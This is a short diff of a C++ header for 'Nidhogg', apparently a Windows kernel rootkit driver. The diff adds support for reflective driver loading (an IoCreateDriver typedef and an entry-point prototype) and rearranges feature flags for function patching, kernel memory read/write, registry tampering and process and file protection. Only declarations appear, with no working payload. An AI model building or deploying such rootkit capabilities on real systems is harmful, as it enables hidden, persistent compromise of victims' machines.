@@ -4,6 +4,7 @@
 #include "FastMutex.h"
 #include "AutoLock.h"
 
+// #define DRIVER_REFLECTIVELY_LOADED // Comment or uncomment it when you load the driver reflectively.
 #define DRIVER_PREFIX "Nidhogg: "
 #define DRIVER_DEVICE_NAME L"\\Device\\Nidhogg"
 #define DRIVER_SYMBOLIC_LINK L"\\??\\Nidhogg"
@@ -45,6 +46,7 @@
 #define SUPPORTED_HOOKED_NTFS_CALLBACKS 1
 
 // Prototypes.
+NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
 NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status = STATUS_SUCCESS, ULONG_PTR info = 0);
 DRIVER_UNLOAD NidhoggUnload;
 DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;
@@ -83,17 +85,22 @@ typedef NTSTATUS(NTAPI* tNtfsIrpFunction)(
 	PDEVICE_OBJECT DeviceObject,
 	PIRP Irp);
 
+typedef NTSTATUS(NTAPI* tIoCreateDriver)(
+	PUNICODE_STRING DriverName,
+	PDRIVER_INITIALIZE InitializationFunction
+	);
+
 // Globals.
 PVOID RegistrationHandle = NULL;
 
 struct EnabledFeatures {
-	bool FunctionPatching   = true;
-	bool WriteData			= true;
-	bool ReadData			= true;
-	bool RegistryFeatures	= true;
-	bool ProcessProtection	= true;
-	bool FileProtection		= true;
-	bool FileHiding			= true;
+	bool DriverReflectivelyLoaded = false;
+	bool FunctionPatching		  = true;
+	bool WriteData				  = true;
+	bool ReadData				  = true;
+	bool RegistryFeatures		  = true;
+	bool ProcessProtection		  = true;
+	bool FileProtection			  = true;
 };
 EnabledFeatures Features;
 
